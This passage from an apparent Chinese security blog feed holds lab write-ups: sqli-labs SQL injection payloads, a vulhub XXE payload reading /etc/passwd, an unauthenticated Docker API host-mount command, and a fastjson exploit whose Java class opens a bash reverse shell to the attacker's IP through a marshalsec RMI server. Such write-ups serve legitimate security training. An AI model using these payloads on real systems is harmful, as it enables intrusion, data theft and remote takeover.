<p><img src="https://img-blog.csdnimg.cn/d5c4ae2647a940dbb673e9de42011c8d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>补充：</p>
<p>可以使用一句话木马，使用菜刀连接</p>
<p><img src="https://img-blog.csdnimg.cn/20201017225528495.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="less-47"><a href="#less-47" class="headerlink" title="less-47"></a>less-47</h1><p><img src="https://img-blog.csdnimg.cn/5d1204c7916048a6b61babb474255198.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 查看源码，我们发现，这里的id增添了单引号而已，其余和46关一致</p>
<h1 id="-8"><a href="#-8" class="headerlink" title></a><img src="https://img-blog.csdnimg.cn/f0342892e63e4ab6abfb678416021515.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></h1><h1 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h1><p>同46关，只不过关闭了报错，无法使用报错注入</p>
<h1 id="Less49"><a href="#Less49" class="headerlink" title="Less49"></a>Less49</h1><p>同47，关闭了报错，无法使用报错注入</p>
<h1 id="less-50"><a href="#less-50" class="headerlink" title="less-50"></a>less-50</h1><p>本关</p>
<p><img src="https://img-blog.csdnimg.cn/2d564f2fd9c7450b906f51ffbcd60b63.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/a5ebf29c62d84b7b92954f2552510cee.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/c93488e0dbd447cca1f39393921cf9e6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>说明我们可以在这一关使用，堆叠注入（同时我们也可以，报错，延时注入）</p>
<p><img src="https://img-blog.csdnimg.cn/97c27914ea9a4c329849643d19d89421.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="less-51"><a href="#less-51" class="headerlink" title="less-51"></a>less-51</h1><p>查看源码</p>
<p><img src="https://img-blog.csdnimg.cn/7cb9f82be3be49c9a28068638109b2e7.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>所以我们依旧堆叠注入（改变了闭合方式）</p>
<p><img src="https://img-blog.csdnimg.cn/cc41b71d12754c40a7e1849da65d7122.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 同时，报错和延时注入都可以使用</p>
<p><img src="https://img-blog.csdnimg.cn/9436ccd629144b068295af3bda914c1a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h1><p>同50关，关闭了报错，采用报错注入以外的手段</p>
<h1 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h1><p>同51关，关闭了报错，采用报错注入以外的手段</p>
<h1 id="less-54"><a href="#less-54" class="headerlink" title="less-54"></a>less-54</h1><p>挑战 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1：HTTP://127.0.0.1/SQLI-LABS/LESS-54/?id=1</span><br><span class="line">2：HTTP://127.0.0.1/SQLI-LABS/LESS-54/?id=1&#x27; --+ // 闭合方式（实际会不断的测试）</span><br><span class="line">3: HTTP://127.0.0.1/SQLI-LABS/LESS-54/?id=1&#x27; order by 3 --+</span><br><span class="line">4: HTTP://127.0.0.1/SQLI-LABS/LESS-54/?id=-1&#x27; union select 1,2,database() --+</span><br><span class="line">5: HTTP://127.0.0.1/SQLI-LABS/LESS-54/?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;challenges&#x27; --+</span><br><span class="line">6: HTTP://127.0.0.1/SQLI-LABS/LESS-54/?id=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;b47m5d71vy&#x27; --+</span><br><span class="line">7: HTTP://127.0.0.1/SQLI-LABS/LESS-54/?id=-1&#x27; union select 1,2,group_concat(concat_ws(0x5e,secret_N87M))  from challenges.b47m5d71vy --+</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/58c930fc8a954d9ea4791a5e32e503eb.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>挑战成功</p>
<p><img src="https://img-blog.csdnimg.cn/805b9ffdbc7f42c5a8febb64fbd08f52.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="less-55"><a href="#less-55" class="headerlink" title="less-55"></a>less-55</h1><p>挑战二</p>
<p>经过不断尝试发现闭合方式 一个括号 </p>
<p><img src="https://img-blog.csdnimg.cn/31586a18cb584d1a9b98a5b198333235.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>占位符回显</p>
<p><img src="https://img-blog.csdnimg.cn/873f279c5967404fbfff32ee8a66973b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 其余步骤与上一关一致</p>
<p>查表</p>
<p><img src="https://img-blog.csdnimg.cn/3c53c05bba994175bcb42bb0c77c946e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 查字段</p>
<p><img src="https://img-blog.csdnimg.cn/3c45eae0e8ff4c0688ea89e5c06bb58e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 查值（最后一波查出值，多多少少有点极限） </p>
<p><img src="https://img-blog.csdnimg.cn/5766221d10bc45abb516cd52ad4ef997.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="Less-56-Challenge-3"><a href="#Less-56-Challenge-3" class="headerlink" title="Less-56:Challenge-3"></a>Less-56:Challenge-3</h1><p> 本关查询语句是SELECT * FROM security.users WHERE id=(‘$id’) LIMIT 0,1</p>
<p>所以payload换为id=-1’) ··· 其余同上一关</p>
<h1 id="Less-57-Challenge-4"><a href="#Less-57-Challenge-4" class="headerlink" title="Less-57:Challenge-4"></a>Less-57:Challenge-4</h1><p> 本关查询语句改为SELECT * FROM security.users WHERE id=”$id” LIMIT 0,1</p>
<p>所以payload换为id=-1” ··· 其余同上一关关</p>
<h1 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h1><p>测试闭合条件，报错可能存在注入，且有报错，尝试报错注入</p>
<p><img src="https://img-blog.csdnimg.cn/7d31ee22375b46efa4da4feef2c44127.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 查表 phph5fjhus <strong>challenges</strong> </p>
<p><img src="https://img-blog.csdnimg.cn/df0e029f91fa4bd49848aad71f96a553.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 查字段，查字段成功后就可以查值了</p>
<p>我这里失误了一下就差一步 ，就不再演示查值了</p>
<p><img src="https://img-blog.csdnimg.cn/e8049668752347758d85f745b567a974.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="-9"><a href="#-9" class="headerlink" title></a></h1><h1 id="Less-59-Challenge-6"><a href="#Less-59-Challenge-6" class="headerlink" title="Less-59:Challenge-6"></a>Less-59:Challenge-6</h1><p> 本关查询语句SELECT * FROM security.users WHERE id=$id LIMIT 0,1</p>
<p>所以payload换为id=-1 ··· 其余同上一关</p>
<h1 id="Less-60-Challenge-7"><a href="#Less-60-Challenge-7" class="headerlink" title="Less-60:Challenge-7"></a>Less-60:Challenge-7</h1><p> 本关查询语句SELECT * FROM security.users WHERE id=(“$id”) LIMIT 0,1</p>
<p>所以payload换为id=-1”) ··· 其余上一关</p>
<h1 id="Less-61-Challenge-8"><a href="#Less-61-Challenge-8" class="headerlink" title="Less-61:Challenge-8"></a>Less-61:Challenge-8</h1><p> 本关查询语句SELECT * FROM security.users WHERE id=((‘$id’)) LIMIT 0,1</p>
<p>所以payload换为id=-1’)) ··· 其余同58关</p>
<h1 id="less-62"><a href="#less-62" class="headerlink" title="less-62"></a>less-62</h1><p>测试发现：关闭了报错</p>
<p>闭合条件为 ‘)</p>
<p><img src="https://img-blog.csdnimg.cn/ae6e0a131b2f434d81ce18d75ba3f4a5.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>采用时间盲注，修改这个地方<code>a </code>范围是0~128 ascii码</p>
<p><img src="https://img-blog.csdnimg.cn/c261deca9bdd412bad9af3e8b6883387.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="Less-63-Challenge-10"><a href="#Less-63-Challenge-10" class="headerlink" title="Less-63:Challenge-10"></a>Less-63:Challenge-10</h1><p> /Less-63/?id=1’ –+,回显正常，说明闭合方式为单引号’</p>
<p>同样时间盲注</p>
<h1 id="Less-64-Challenge-11"><a href="#Less-64-Challenge-11" class="headerlink" title="Less-64:Challenge-11"></a>Less-64:Challenge-11</h1><p> Less-64/?id=1)) –+页面回显正常验证了就是两括号的闭合方式。<br> 时间盲注</p>
<h1 id="Less-65-Challenge-12"><a href="#Less-65-Challenge-12" class="headerlink" title="Less-65:Challenge-12"></a>Less-65:Challenge-12</h1><p> /Less-65/?id=1”) –+页面回显正常，说明闭合方式为双引号括号”)</p>
<p>同样时间盲注</p>
]]></content>
  </entry>
  <entry>
    <title>vulhub漏洞—php环境XML外部实体注入漏洞（XXE）</title>
    <url>/2021/12/17/vulhub%E6%BC%8F%E6%B4%9E%E2%80%94PHP%E7%8E%AF%E5%A2%83-XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88XXE%EF%BC%89/</url>
    <content><![CDATA[<h1 id="PHP环境-XML外部实体注入漏洞（XXE）"><a href="#PHP环境-XML外部实体注入漏洞（XXE）" class="headerlink" title="PHP环境 XML外部实体注入漏洞（XXE）"></a>PHP环境 XML外部实体注入漏洞（XXE）</h1><p><a href="https://blog.blankshell.com/2020/06/09/xxe%E8%AF%A6%E7%BB%86%E6%80%BB%E7%BB%93/">XXE知识总结</a></p>
<h2 id="环境介绍："><a href="#环境介绍：" class="headerlink" title="环境介绍："></a>环境介绍：</h2><ul>
<li>PHP 7.0.30</li>
<li>libxml 2.8.0</li>
</ul>
<p>libxml2.9.0以后，默认不解析外部实体，导致XXE漏洞逐渐消亡。为了演示PHP环境下的XXE漏洞，本例会将libxml2.8.0版本编译进PHP中。PHP版本并不影响XXE利用。</p>
<h2 id="vulhub搭建漏洞："><a href="#vulhub搭建漏洞：" class="headerlink" title="vulhub搭建漏洞："></a>vulhub搭建漏洞：</h2><p>github位置：<a href="https://github.com/vulhub/vulhub/tree/master/php/php_xxe">https://github.com/vulhub/vulhub/tree/master/php/php_xxe</a></p>
<p>使用如下命令编译并启动环境：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<p>环境启动后，访问<code>http://your-ip:8080/index.php</code>即可看到phpinfo，搜索libxml即可看到其版本为2.8.0。</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112171628978.png" alt="image-20211217162815849"></p>
<h1 id="复现漏洞"><a href="#复现漏洞" class="headerlink" title="复现漏洞"></a>复现漏洞</h1><p>Web目录为<code>./www</code>，其中包含4个文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ tree .</span><br><span class="line">.</span><br><span class="line">├── dom.php # 示例：使用DOMDocument解析body</span><br><span class="line">├── index.php</span><br><span class="line">├── SimpleXMLElement.php # 示例：使用SimpleXMLElement类解析body</span><br><span class="line">└── simplexml_load_string.php # 示例：使用simplexml_load_string函数解析body</span><br></pre></td></tr></table></figure>

<p><code>dom.php</code>、<code>SimpleXMLElement.php</code>、<code>simplexml_load_string.php</code>均可触发XXE漏洞，具体输出点请阅读这三个文件的代码。</p>
<h2 id="简单的-XXE-Payload："><a href="#简单的-XXE-Payload：" class="headerlink" title="简单的 XXE Payload："></a>简单的 XXE Payload：</h2><p>POST /simplexml_load_string.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112171632386.png"></p>
]]></content>
  </entry>
  <entry>
    <title>vulhub漏洞—docker_daemon_api未授权访问漏洞</title>
    <url>/2021/12/17/vulhub%E6%BC%8F%E6%B4%9E%E2%80%94docker-daemon-api%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="docker-remote-api"><a href="#docker-remote-api" class="headerlink" title="docker remote  api"></a>docker remote  api</h1><p>docker remote  api主要的目的是取代命令行界面,</p>
<p>docker client和docker daemon通过unix domain socket进行通信.</p>
<p>默认情况下，只有本机的root和docker组用户才能操作docker.</p>
<h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>dockerd -H unix:///var/run/docker. sock -H 0.0. 0.0:2375<br>docker守护进程监听在0.0.0.0，外网可访问<br>没有使用iptable等限制可连接的来源ip</p>
<h1 id="漏洞危害及常见的攻击方式"><a href="#漏洞危害及常见的攻击方式" class="headerlink" title="漏洞危害及常见的攻击方式"></a>漏洞危害及常见的攻击方式</h1><p>1.远程对被攻击主机的docker容器进行操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker  -H tcp://*.*.*.*:2375 images</span><br></pre></td></tr></table></figure>

<p>2.远程启动被攻击主机的docker容器，并挂载宿主机的目录，通过容器来修改宿主机的author ized_ keys文件，写入公钥。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker H tcp://*.*.*.*:2375 run -it-v /:/mnt imagelD /bin/sh</span><br></pre></td></tr></table></figure>

<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>vulhub漏洞：<a href="https://github.com/vulhub/vulhub/blob/master/docker/unauthorized-rce/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/docker/unauthorized-rce/README.zh-cn.md</a></p>
<p>编译及启动漏洞环境：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<p>环境启动后，将监听2375端口。</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112171844440.png" alt="image-20211217184420395"></p>
<p>访问 /version 目录下可以访问到对应的docker版本</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112171856592.png" alt="image-20211217185604520"></p>
<p><a href="http://ip:2375/containers/json">http://ip:2375/containers/json</a>  列出容器信息</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112171859485.png" alt="image-20211217185926347"></p>
<p><a href="http://ip:2375/images/json">http://ip:2375/images/json</a> 列出 images 列表</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112171900361.png" alt="image-20211217190046264"></p>
<h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><p>准备一个安装好docker的虚拟机或者vps</p>
<p><em>获取镜像信息</em></p>
<p><code>docker -H tcp://靶机ip:2375 images</code></p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112171904951.png" alt="image-20211217190452897"></p>
<p><em>随意启动一个容器，并将宿主机的 / 目录挂载到容器的 /mnt目录，这样就可以操作宿主机中的文件了</em></p>
<p><code>docker -H tcp://靶机ip:2375 run -it -v /:/mnt b39e0b392b7e /bin/sh</code></p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112171905319.png" alt="image-20211217190536264"></p>
]]></content>
  </entry>
  <entry>
    <title>vulhub漏洞—fastjson</title>
    <url>/2021/12/08/vulhub%E6%BC%8F%E6%B4%9E%E2%80%94fastjson/</url>
    <content><![CDATA[<p> 我们只知道一个IP</p>
<p>nmap扫描端口</p>
<p>我们可以看到 8090 opsmessaging</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081030376.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>Xary扫描没有发现漏洞</p>
<p>访问 8090 端口</p>
<p><img src="https://img-blog.csdnimg.cn/16dda282a97a49b896e80c04ebd6b5e2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARXJZYW83,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<span id="more"></span>

<h1 id="fastjson反序列化漏洞验证POC"><a href="#fastjson反序列化漏洞验证POC" class="headerlink" title="fastjson反序列化漏洞验证POC"></a>fastjson反序列化漏洞验证POC</h1><p><a href="http://www.dnslog.cn/">DNSLog Platform</a></p>
<p>获取dnslog</p>
<p>burp抓包修改数据包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line"></span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;zeo&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;m7ds09.dnslog.cn&quot;&#125;&#125;   //val替换成自己获取到的dnslog</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>发送数据包，成功访问到age</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081030496.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/bd2bb1a7f93140bbbdc2c033417e383f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARXJZYW83,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>说明存在漏洞</p>
<p>参考文章：</p>
<p><a href="https://blog.csdn.net/qq_45300786/article/details/118636692">【vulhub】fastjson反序列化漏洞验证POC_樱浅沐冰的博客-CSDN博客</a></p>
<h1 id><a href="#" class="headerlink" title></a></h1><h1 id="fastjson漏洞利用——反弹shell"><a href="#fastjson漏洞利用——反弹shell" class="headerlink" title="fastjson漏洞利用——反弹shell"></a>fastjson漏洞利用——反弹shell</h1><p>再攻击机上 编写 TouchFile.java </p>
<p>java文件中写入 反弹shell命令</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TouchFile</span> </span>&#123;</span><br><span class="line">   <span class="keyword">static</span> &#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">                Runtime r = Runtime.getRuntime();</span><br><span class="line">                Process p = r.exec(<span class="keyword">new</span> String[]&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/攻击机ip/端口 0&gt;&amp;1&quot;</span>&#125;);</span><br><span class="line">                p.waitFor();</span><br><span class="line">       &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">           <span class="comment">// do nothing</span></span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>生成TouchFile.class (使用jdk8版本)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javac TouchFile.java</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>得到TouchFile.class文件，并在将其通过<a href="https://so.csdn.net/so/search?from=pc_blog_highlight&q=python">python</a>3 -m http.server命令放到外网环境中,默认监听端口8000。</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081030338.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>攻击机 ip + 8000 访问 ，看到了TouchFile.class</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081030415.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>然后我们借助marshalsec项目，启动一个RMI服务器，监听9999端口，并制定加载远程类TouchFile.class：</p>
<p><a href="https://github.com/RandomRobbieBF/marshalsec-jar">https://github.com/RandomRobbieBF/marshalsec-jar<img src="https://csdnimg.cn/release/blog_editor_html/release1.9.5/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=LA92" alt=" ">https://github.com/RandomRobbieBF/marshalsec-jar</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://攻击机ip:8000/#TouchFile&quot; 9999</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081030727.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
